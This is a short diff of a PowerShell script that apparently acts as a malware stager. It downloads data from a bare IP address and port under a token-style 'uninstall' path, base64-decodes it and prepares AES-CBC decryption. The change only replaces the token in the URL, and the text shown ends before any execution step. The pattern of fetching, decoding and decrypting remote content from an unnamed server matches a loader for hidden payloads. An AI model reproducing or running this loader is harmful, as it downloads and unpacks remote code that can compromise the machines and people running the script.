@@ -1,6 +1,6 @@
 $ErrorActionPreference='Stop'
 [Net.ServicePointManager]::SecurityProtocol='Tls12'
-$r=Invoke-RestMethod -UseBasicParsing 'http://51.75.118.5:20216/s/tk-482913-a7f2c/uninstall' -Headers @{'Cache-Control'='no-cache'}
+$r=Invoke-RestMethod -UseBasicParsing 'http://51.75.118.5:20216/s/tk-48232543-a9d6F/uninstall' -Headers @{'Cache-Control'='no-cache'}
 $b=[Convert]::FromBase64String($r.c)
 $a=[Security.Cryptography.Aes]::Create()
 $a.Mode='CBC';$a.Padding='PKCS7'
